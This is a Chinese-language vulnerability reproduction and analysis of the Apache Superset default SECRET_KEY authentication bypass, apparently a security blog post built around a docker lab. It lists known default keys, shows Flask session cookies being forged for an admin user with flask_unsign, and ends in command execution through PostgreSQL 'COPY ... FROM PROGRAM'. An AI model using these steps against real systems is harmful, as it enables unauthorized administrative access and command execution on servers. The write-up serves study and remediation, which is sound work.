## 漏洞简介

![image](https://image.3001.net/images/20230620/1687230531_64911843604e20893c8df.png!small)

Apache Superset是一个开源的数据可视化和数据探测平台，它基于Python构建，使用了一些类似于Django和Flask的Python
web框架。提供了一个用户友好的界面，可以轻松地创建和共享仪表板、查询和可视化数据，也可以集成到其他应用程序中。由于用户在默认安装过程中，未对SECRET_KEY的默认值进行更改，未经身份验证的攻击者通过伪造管理员身份进行访问后台，并通过后台原本数据库执行功能实现命令执行操作。‍

## 环境搭建

可以通过 fofa 来搜索相关网站

"Apache Superset"

![image](https://image.3001.net/images/20230620/1687230532_649118446fdf8cf175974.png!small)

这里我们通过 docker 来在本地搭建环境

![image](https://image.3001.net/images/20230620/1687230533_64911845a77ce615181d9.png!small)

    
    
    git clone https://github.com/apache/superset.git  
    cd superset  
    git checkout 2.0.0  
    TAG=2.0.0 docker-compose -f docker-compose-non-dev.yml pull  
    TAG=2.0.0 docker-compose -f docker-compose-non-dev.yml up

官网提供的方法 并没有搭建成功，还是直接在docker 仓库中查找

[https://hub.docker.com/r/apache/superset/tags?page=1&ordering=last_updated&name=2.0.0](https://hub.docker.com/r/apache/superset/tags?page=1&ordering=last_updated&name=2.0.0)

![image](https://image.3001.net/images/20230620/1687230535_649118477a0aee7ea7afd.png!small)

    
    
    docker pull apache/superset:2.0.0  
    docker exec -it superset superset fab create-admin --username admin --firstname Superset  --lastname Admin --email admin@superset.com --password admin  
    docker exec -it superset superset db upgrade  
    docker exec -it superset superset load_examples  
    docker exec -it superset superset init

## ​漏洞复现

利用脚本检测是否存在漏洞并生成相对应的 cookie

![image](https://image.3001.net/images/20230620/1687230536_64911848da5eca5f91702.png!small)

访问主页抓取数据包

![image](https://image.3001.net/images/20230620/1687230538_6491184a3970f02d67a61.png!small)

将生成的 session 替换原本的 session

![image](https://image.3001.net/images/20230620/1687230539_6491184ba3266f5e19d9a.png!small)​成功登录

![image](https://image.3001.net/images/20230620/1687230541_6491184d5cd86edd905e7.png!small)

接下来就是想办法 getshell 网络上的文章上是通过后台数据库执行语句来获取权限。

经过复现分析，发现存在的问题还比较多，首先是默认情况下执行语句仅仅支持 SELECT ，需要修改数据库的权限允许其他的一些语句（but
一些版本上是没有对数据库的操作权限的），然后就是获取的权限，本质上也只是获取了数据库的执行权限，数据库有可能并不与 superset
在同一服务器上，再有就是需要数据库本身也需要存在漏洞才可以，我这里选取了 （CVE-2019-9193）PostgreSQL 高权限命令执行漏洞来复现漏洞。

![image](https://image.3001.net/images/20230620/1687230542_6491184ea984f776aefdd.png!small)

![image](https://image.3001.net/images/20230620/1687230544_64911850082ca2dfcced0.png!small)

![image](https://image.3001.net/images/20230620/1687230545_649118514f6dadc8abbbd.png!small)

    
    
    DROP TABLE IF EXISTS cmd_exec;  
    CREATE TABLE cmd_exec(cmd_output text);  
    COPY cmd_exec FROM PROGRAM 'id';  
    SELECT * FROM cmd_exec;

![image](https://image.3001.net/images/20230620/1687230546_64911852ebab9bb52fe5b.png!small)

## 漏洞分析

感觉这个漏洞有点像前段时间爆出来的 nacos 身份认证绕过漏洞 存在默认的密钥

    
    
    SECRET_KEYS = [  
    b'\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h',  # version < 1.4.1  
    b'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET',          # version >= 1.4.1  
    b'thisISaSECRET_1234',                            # deployment template  
    b'YOUR_OWN_RANDOM_GENERATED_SECRET_KEY',          # documentation  
    b'TEST_NON_DEV_SECRET'                            # docker compose  
    ]

Superset 是用 Python 编写的，基于 Flask Web 框架。基于 Flask 的应用程序的常见做法是使用加密签名的会话 cookie
进行用户状态管理。当用户登录时，Web 应用程序将包含用户标识符的会话 cookie 发送回最终用户的浏览器。Web 应用程序使用 SECERT_KEY 对
cookie 进行签名，该值应该时随机生成的，通常存储在本地配置文件中，对于每个 Web 请求，浏览器都会将已签名的会话 cookie
发送回应用程序，然后应用程序验证 cookie 上的签名以处理请求之前重新验证用户。

整段描述下面我感觉跟 JWT 的相关验证方式差不太多，我们具体来操作看看。

![image](https://image.3001.net/images/20230620/1687230548_649118544ea8b1a41ce5e.png!small)

首先就是请求的时候我们可以看到 cookie 值 可以解码成功，通过爆破（当然我们这里是已经已知这个 key 值），伪造生成用户的
cookie，替换数据包中的cookie 值，就成功登录成功，之后再次请求的时候，发现我们添加的字段已经被保存在 session 值中

    
    
    >>> from flask_unsign import session  
    >>> session.decode("eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiOGUzOTdiZTQ2ZjVlZjJiYTc1NjI4MWQxODE2NTAyMWEzMzcxYjI3OCIsImxvY2FsZSI6ImVuIn0.ZJAEeQ.wVfrGzupbWdw4R1OlzUwUqhGMMY")  
    {'_fresh': False, 'csrf_token': '8e397be46f5ef2ba756281d18165021a3371b278', 'locale': 'en'}  
    >>> session.sign({'_user_id': 1, 'user_id': 1},'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET')  
    'eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZJAFNg.oWyP7v-1l0qOHFOMjSd-cFiVQLY'  
    >>> session.decode(".eJxFzEEOhCAQBMC_9JmDwMZBPkOUaaKRaALuabN_15sPqPohlca-Ipa5dhqkb2dLmyJag9xbSde580CEjoHiQlYOlt4VDVMe3CjTRxYv3i_qGEQsDOqZ58rHPNDgHf83roYh1w.ZJAFVw.IwmWyTU1bvoY2nhlFYdmwXNNtTM")  
    {'_fresh': False, '_user_id': 1, 'csrf_token': 'd68e728cde01e32fd89c0267947b3733bd2e8771', 'locale': 'en', 'user_id': 1}

![image](https://image.3001.net/images/20230620/1687230549_64911855e7280b21d7908.png!small)

## 漏洞修复

拒绝在非调试环境中使用默认密码启动![image](https://image.3001.net/images/20230620/1687230551_649118572e0b1fd6c46db.png!small)  
![image](https://image.3001.net/images/20230620/1687230552_64911858857a0ffbefaf4.png!small)

###  **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

‍

